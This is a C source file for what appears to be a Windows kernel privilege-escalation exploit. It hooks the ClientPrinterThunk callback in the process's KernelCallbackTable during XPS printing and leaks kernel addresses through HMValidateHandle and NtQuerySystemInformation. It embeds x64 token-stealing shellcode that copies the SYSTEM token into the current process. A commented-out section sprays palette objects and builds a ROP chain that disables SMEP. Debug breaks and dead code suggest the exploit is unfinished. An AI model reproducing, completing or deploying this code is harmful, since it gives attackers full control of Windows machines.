#include <windows.h>
//#include <wdm.h>
#include <ntstatus.h>
#include <stdio.h>
#include <winddi.h>
#include <winspool.h> 

#include <ntstatus.h>
#include "ntos.h"
#pragma comment(lib, "ntdll.lib")
#ifdef _MSC_VER
#define _CRT_SECURE_NO_WARNINGS
#endif
//#pragma comment(lib,"Ntoskrnl.lib")
typedef WNDOBJ(__stdcall* gEngCreateWnd)(SURFOBJ,HWND, WNDOBJCHANGEPROC,FLONG,INT);
typedef int(__fastcall* gNtGdiExtEscape)(HDC, PWCHAR, INT, INT, INT, LPSTR, INT, LPSTR);
typedef BOOL(__fastcall* gNextBand)(HDC,BOOL, POINTL*, PSIZE);
typedef BOOL(__fastcall* gNtGdiExtTextOutW)(HDC, INT, INT, UINT, LPRECT, LPWSTR, INT, LPINT, DWORD);
typedef NTSTATUS(NTAPI* pUser32_ClientPrinterThunk)(PVOID p);
typedef BOOL(__fastcall* gNtGdiExtTextOut)(HDC, INT, INT, UINT, LPRECT, LPWSTR, INT, LPINT);
typedef BOOL(__stdcall* gDrvEnableDriver)(ULONG, ULONG, DRVENABLEDATA*);
typedef void(_stdcall* gDrvDisableDriver)();
typedef NTSTATUS(__stdcall* pDrvEnableDriver)(PVOID p);
pDrvEnableDriver		g_originalDED = NULL;
PVOID g_ppDED = NULL;
typedef void(__stdcall* gNtGdiFlushUserBatch)();
typedef BOOL(__fastcall* gNtGdiDoBanding)(HDC,BOOL, POINTL,PSIZE);
typedef BOOL(__stdcall* hookFunction)(SURFOBJ,POINTL);


pUser32_ClientPrinterThunk		g_originalCPT = NULL;
PVOID g_ppCPT = NULL;
typedef BOOL(__fastcall* gNtGdiEndDoc)(HDC);
gNtGdiEndDoc ntgdiedobanding;
gNtGdiExtEscape g_NtGdiExtEscape;


typedef struct SYSTEM_MODULE {
	ULONG                Reserved1;
	ULONG                Reserved2;
	ULONG				 Reserved3;
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 LoadCount;
	WORD                 NameOffset;
	CHAR                 Name[256];
}SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;



typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)(
	__in SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__inout PVOID SystemInformation,
	__in ULONG SystemInformationLength,
	__out_opt PULONG ReturnLength
	);

HDC hdc = NULL;
gDrvEnableDriver g_fake = NULL;
void* fDrvEnableDriver1 = NULL;
HDC g_hdc;

HWND hWnd;
HDC hDc;
INT64 kernelBase;
HDC hMemDC;
static HBITMAP bitmaps[2000];

#ifdef _WIN64
typedef void* (NTAPI* lHMValidateHandle)(HWND h, int type);
#else
typedef void* (__fastcall* lHMValidateHandle)(HWND h, int type);
#endif


lHMValidateHandle pHmValidateHandle = NULL;

typedef struct _DESKTOPINFO
{
	/* 000 */ PVOID        pvDesktopBase;
	/* 008 */ PVOID        pvDesktopLimit;

} DESKTOPINFO, * PDESKTOPINFO;
typedef struct _CLIENTINFO
{
	/* 000 */ DWORD             CI_flags;
	/* 004 */ DWORD             cSpins;
	/* 008 */ DWORD             dwExpWinVer;
	/* 00c */ DWORD             dwCompatFlags;
	/* 010 */ DWORD             dwCompatFlags2;
	/* 014 */ DWORD             dwTIFlags;
	/* 018 */ DWORD				filler1;
	/* 01c */ DWORD				filler2;
	/* 020 */ PDESKTOPINFO      pDeskInfo;
	/* 028 */ ULONG_PTR         ulClientDelta;

} CLIENTINFO, * PCLIENTINFO;
typedef struct _HEAD
{
	HANDLE h;
	DWORD  cLockObj;
} HEAD, * PHEAD;

typedef struct _THROBJHEAD
{
	HEAD h;
	PVOID pti;
} THROBJHEAD, * PTHROBJHEAD;
//
typedef struct _THRDESKHEAD
{
	THROBJHEAD h;
	PVOID    rpdesk;
	PVOID       pSelf;   // points to the kernel mode address
} THRDESKHEAD, * PTHRDESKHEAD;

BOOL FindHMValidateHandle() {
	HMODULE hUser32 = LoadLibraryA("user32.dll");
	if (hUser32 == NULL) {
		printf("Failed to load user32");
		return FALSE;
	}

	BYTE* pIsMenu = (BYTE*)GetProcAddress(hUser32, "IsMenu");
	if (pIsMenu == NULL) {
		printf("Failed to find location of exported function 'IsMenu' within user32.dll\n");
		return FALSE;
	}
	unsigned int uiHMValidateHandleOffset = 0;
	for (unsigned int i = 0; i < 0x1000; i++) {
		BYTE* test = pIsMenu + i;
		if (*test == 0xE8) {
			uiHMValidateHandleOffset = i + 1;
			break;
		}
	}
	if (uiHMValidateHandleOffset == 0) {
		printf("Failed to find offset of HMValidateHandle from location of 'IsMenu'\n");
		return FALSE;
	}

	unsigned int addr = *(unsigned int*)(pIsMenu + uiHMValidateHandleOffset);
	unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr;
	//The +11 is to skip the padding bytes as on Windows 10 these aren't nops
	pHmValidateHandle = (lHMValidateHandle)((ULONG_PTR)hUser32 + offset + 11);
	return TRUE;
}

LRESULT CALLBACK MainWProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

INT64 getKernelBase() {
	printf("[+] Getting Kernel Base.\n");
	PNtQuerySystemInformation NtQuerySystemInformation = (PNtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
	if (!NtQuerySystemInformation) {
		printf("[-] Fail to Load the function NtQuerySystemInformation\n");
		exit(1);
	}
	ULONG len = 0;
	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
	PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation, pModuleInfo, len, &len);
	if (status != (NTSTATUS)0x0) {
		printf("[-] NtQuerySystemInformation Fail\n");
		exit(1);
	}
	PVOID kernelImageBase = pModuleInfo->Modules[0].ImageBaseAddress;
	printf("ntoskrnl.exe base addr: %p\n", kernelImageBase);
	return kernelImageBase;

}
PVOID g_ulClientDelta;
static HBITMAP bitmaps[2000];
BOOL testData(SURFOBJ* pso, POINTL* pptl) {
	WNDOBJ* wdo;
	pptl->x = 0xffffffff;
	pptl->y = 0xffffffff;
	printf("Surfobj: %p\n", pso);
	printf("POINTL: %p\n", pptl);
	DebugBreak();



	BYTE shellcode[] =
		"\x65\x48\x8B\x14\x25\x88\x01\x00\x00"      // mov rdx, [gs:188h]       ; Get _ETHREAD pointer from KPCR
		"\x4C\x8B\x82\xB8\x00\x00\x00"              // mov r8, [rdx + b8h]      ; _EPROCESS (kd> u PsGetCurrentProcess)
		"\x4D\x8B\x88\xf0\x02\x00\x00"              // mov r9, [r8 + 2f0h]      ; ActiveProcessLinks list head
		"\x49\x8B\x09"                              // mov rcx, [r9]            ; Follow link to first process in list
		//find_system_proc:
		"\x48\x8B\x51\xF8"                          // mov rdx, [rcx - 8]       ; Offset from ActiveProcessLinks to UniqueProcessId
		"\x48\x83\xFA\x04"                          // cmp rdx, 4               ; Process with ID 4 is System process
		"\x74\x05"                                  // jz found_system          ; Found SYSTEM token
		"\x48\x8B\x09"                              // mov rcx, [rcx]           ; Follow _LIST_ENTRY Flink pointer
		"\xEB\xF1"                                  // jmp find_system_proc     ; Loop
		//found_system:
		"\x48\x8B\x41\x68"                          // mov rax, [rcx + 68h]     ; Offset from ActiveProcessLinks to Token
		"\x24\xF0"                                  // and al, 0f0h             ; Clear low 4 bits of _EX_FAST_REF structure
		"\x49\x89\x80\x58\x03\x00\x00"              // mov [r8 + 358h], rax     ; Copy SYSTEM token to current process's token
		"\x48\x83\xC4\x40"                          // add rsp, 040h
		"\x48\x31\xF6"                              // xor rsi, rsi             ; Zeroing out rsi register to avoid Crash
		"\x48\x31\xC0"                              // xor rax, rax             ; NTSTATUS Status = STATUS_SUCCESS
		"\xc3";

	LPVOID shellcode_addr = VirtualAlloc(NULL,
		sizeof(shellcode),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	memcpy(shellcode_addr, shellcode, sizeof(shellcode));

	static HPALETTE hp1[2000];
	LOGPALETTE* rPalette;
	rPalette = (LOGPALETTE*)malloc(sizeof(LOGPALETTE) + (0x1100 - 1) * sizeof(PALETTEENTRY));

	rPalette->palNumEntries = 0x1100;
	rPalette->palVersion = 0x0300;

	BOOL bFound = FindHMValidateHandle();
	if (!bFound) {
		printf("Failed to locate HmValidateHandle, exiting\n");
		return 1;
	}
	printf("Found location of HMValidateHandle in user32.dll\n");
	WNDCLASSEX wnd = { 0x0 };
	wnd.cbSize = sizeof(wnd);
	wnd.lpszClassName = TEXT("MainWClass");
	wnd.lpfnWndProc = MainWProc;
	int result = RegisterClassEx(&wnd);
	if (!result)
	{
		printf("RegisterClassEx error: %d\r\n", GetLastError());
	}

	HWND test = CreateWindowEx(
		0,
		wnd.lpszClassName,
		TEXT("WORDS"),
		0,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		NULL, NULL, NULL, NULL);
	PVOID KtagWND = (PVOID)pHmValidateHandle(test, 1);
	PVOID KtagCLS = *((PVOID*)((PBYTE)KtagWND + 0x98));

	//PVOID KtagCLS = (*(&KtagWND+0x90));
	printf("Kernel TagCLS: %p\n", KtagCLS);
	PVOID lpszMenuName = (PBYTE)KtagCLS - g_ulClientDelta + 0x88;
	printf("lpszMenuName: %p\n", lpszMenuName);
	DestroyWindow(test);
	UnregisterClassW("MainWClass",NULL);
	for(int i=0;i<2;i++){
		hp1[i]=CreatePalette(rPalette);
	}
	printf("Leak Palette Obj: %p\n", lpszMenuName);
	UINT* r1Palette;
	r1Palette = (UINT*)malloc((0x1000 - 1) * sizeof(PALETTEENTRY));
	memset(r1Palette, 0x0, (0x1000 - 1) * sizeof(PALETTEENTRY));
	UINT res = GetPaletteEntries(hp1[0], 0, 0x400, (LPPALETTEENTRY)rPalette);
	printf("LPPALETTEENTRY: %p\n", rPalette);
	printf("HPallete: %p\n", hp1[0]);
	ntgdiedobanding(g_hdc);
	/*
	LOGPALETTE* lPalette;

	//0x1E3  = 0x7e8+8
	char buffer[2000];
	memset(buffer, 0x41414141, 2000);
	HBITMAP hmb;
	for (int i = 0; i < 2000; i++) {
		hmb=CreateBitmap(1, 30, 1, 32, &buffer);
		bitmaps[i] = hmb;
	}
	for (int s = 0; s < 2000; s++) {
		DeleteObject(bitmaps[s]);
	}

	
	lPalette = (LOGPALETTE*)malloc(sizeof(LOGPALETTE) + (0xb4 - 1) * sizeof(PALETTEENTRY));

	lPalette->palNumEntries = 0xb4;

	
	lPalette->palVersion = 0x0300;
	static HPALETTE hp[2000];
	
	INT64 pop_rcx = kernelBase + 0x157CB0;
	INT64 mov_cr4 = kernelBase + 0x1d87d7;


	LPVOID ptr_jmpfunc = VirtualAlloc(NULL, 3000, MEM_RESERVE, PAGE_READWRITE); //reserving memory
	ptr_jmpfunc = VirtualAlloc(ptr_jmpfunc, 3000, MEM_COMMIT, PAGE_READWRITE); //commiting memory  
	LPVOID ptr1 = VirtualAlloc(NULL, 3000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	LPVOID ptr2 = VirtualAlloc(NULL, 3000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	LPVOID store_rop_shell = VirtualAlloc(NULL, 3000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	(store_rop_shell) = &pop_rcx;
	*(ULONG_PTR*)((PBYTE)store_rop_shell+8) = 0x70678;
	*(ULONG_PTR*)((PBYTE)store_rop_shell + 16) = store_rop_shell;
	*(ULONG_PTR*)((PBYTE)store_rop_shell + 24) = shellcode_addr;




	*(ULONG_PTR*)ptr_jmpfunc = 0x43415254;
	*(ULONG_PTR*)((PBYTE)ptr1 + 0x30) = ptr2;
	*(ULONG_PTR*)((PBYTE)ptr_jmpfunc +0x20) = ptr1;
	*(ULONG_PTR*)((PBYTE)ptr_jmpfunc + 0x28) = (PBYTE)store_rop_shell;
	printf("User mode control pointer: %p\n", ptr_jmpfunc);
	*(ULONG_PTR*)(lPalette->palPalEntry+4) = 0x444E5745;
	*(ULONG_PTR*)(lPalette->palPalEntry + 8) = ptr_jmpfunc;



	//memset(lPalette->palPalEntry,0x41,0xb4*4 );
	//memset(lPalette->palPalEntry+1, 0x42, 1);
	//memset(lPalette->palPalEntry+0x98, 0x444E5745, 4);
	HPALETTE h;
	for (int i = 0; i < 2000; i++) {
		h= CreatePalette(lPalette);
	
		//hp[i] = h;
	}
	
	
	for (int i = 0; i < 2000; i++) {
		DeleteObject(hp[i]);
	}
	for (int i = 0; i < 2300; i++) {
		h = CreatePalette(lPalette);

		//hp[i] = h;
	}





	
	//VirtualFree(ptr, 0, MEM_RELEASE);


	/*
	for (int i = 0; i <= 1000; i++) {
		HANDLE h=CreateCompatibleBitmap(hDc, 100, 100);
		SelectObject(hMemDC, h);
		printf("HBITMAP %d ", h);
	}
	*/
	
	return TRUE;
}



int i = 0;
NTSTATUS NTAPI hookCPT(
	PVOID p
)
{
	i++;
	if (i == 4) {
		BOOL(*testfn_ptr)() = &testData;
		MEMORY_BASIC_INFORMATION thunkMemInfo;
		PVOID c = ((PBYTE)p + 24);
		PVOID d = *((ULONG_PTR*)c);
		PVOID e = (PBYTE)d+16;
		PVOID f = *((ULONG_PTR*)e);
		PVOID g = *(ULONG_PTR*)f;
		PVOID h = (PBYTE)g+0x218;
		//PVOID f = &e + 0x218;

		if (!VirtualProtect(h, sizeof(PBYTE), PAGE_EXECUTE_READWRITE, &thunkMemInfo)) {
			printf("Fail to set Read-Write: %d\n", GetLastError());
		}
		*(ULONG_PTR*)h = (*testfn_ptr);
		
		printf("Pointer here: %p\n", &(BYTE)p);
		//f = (*testfn_ptr);
		/*
		printf("%p\n:", c);
		printf("First: %p\n", d);
		printf("Second: %p\n", e);
		printf("Third: %p\n", f);
		printf("Third: %p\n", g);
		printf("Third: %p\n", h);
		*/
	}




	return g_originalCPT(p);
}

DRVENABLEDATA pded;

int main() {
	DOCINFO docinfo;
	PTEB teb = NtCurrentTeb();
	DWORD64 win32client = (DWORD64)teb->Win32ClientInfo;
	PCLIENTINFO pinfo = (PCLIENTINFO)win32client;
	g_ulClientDelta = pinfo->ulClientDelta;
	PPEB peb = teb->ProcessEnvironmentBlock;
	DWORD prot;
	DWORD err = NULL;

	MEMORY_BASIC_INFORMATION thunkMemInfo;
	//RtlZeroMemory(&pded, sizeof(DRVENABLEDATA));
	printf("TEB: %p\n", teb);
	printf("PEB: %p\n", teb);
	RECT rect;
	POINTL pointL;
	LPXFORM pxf;
	PSIZE size;
	PERBANDINFO* ppbi;
	const XFORM* lpxf;
	HINSTANCE hinst = GetModuleHandle(NULL);;
	RtlZeroMemory(&pointL, sizeof(POINTL));
	kernelBase = getKernelBase();
	hWnd = CreateWindowW(L"BUTTON", L"TestWindow", WS_OVERLAPPEDWINDOW | WS_VISIBLE,
		CW_USEDEFAULT, CW_USEDEFAULT, 100, 100,
		NULL, NULL, hinst, 0);


	g_hdc = CreateDCA(0, "Microsoft XPS Document Writer", 0, 0);


	hDc = GetDC(hWnd);
	hMemDC = CreateCompatibleDC(hDc);


	printf("HDC: %p", g_hdc);
	docinfo.cbSize = sizeof(DOCINFO);
	docinfo.lpszDocName = TEXT("C:\\test\\test.txt");
	docinfo.lpszOutput = TEXT("C:\\test\\test.xps");
	docinfo.lpszDatatype = (LPTSTR)(0);
	docinfo.fwType = 0;




	HMODULE loadLib = LoadLibrary(TEXT("gdi32full.dll"));
	if (!loadLib) {
		printf("Load gdi32full error: %d", GetLastError());
	}
	gNextBand g_NextBand = (gNextBand)GetProcAddress(loadLib, "NtGdiDoBanding");
	if (!g_NextBand) {
		printf("Get function NextBand error: %d", GetLastError());
	}
	g_NtGdiExtEscape = (gNtGdiExtEscape)GetProcAddress(loadLib, "NtGdiExtEscape");
	if (!g_NtGdiExtEscape) {
		printf("Get function g_NtGdiExtTextOutW error: %d", GetLastError());
	}

	ntgdiedobanding = (gNtGdiEndDoc)GetProcAddress(loadLib, "NtGdiEndDoc");




	StartDocA(g_hdc, &docinfo);

	printf("StartDoc: %d\n", GetLastError());
	StartPage(g_hdc);
	printf("Start Page: %d\n", GetLastError());
	DebugBreak();
	//ExtEscape(g_hdc, WNDOBJ_SETUP, 8, (LPCSTR)&hWnd, 0, (LPSTR)NULL);


	//LPCSTR a = "Test String";
	//TextOutA(g_hdc, 0, 0, a, 11);
	g_ppCPT = &((PVOID*)peb->KernelCallbackTable)[0x67];
	if (!VirtualProtect(g_ppCPT, sizeof(PVOID), PAGE_EXECUTE_READWRITE, &prot)) {
		printf("Fail in set read-write: %d", GetLastError());
	}




	g_originalCPT = InterlockedExchangePointer(g_ppCPT, &hookCPT);
	EndPage(g_hdc);
	


	DestroyWindow(hWnd);
	DebugBreak();





	
	system("pause");
	return 0;
}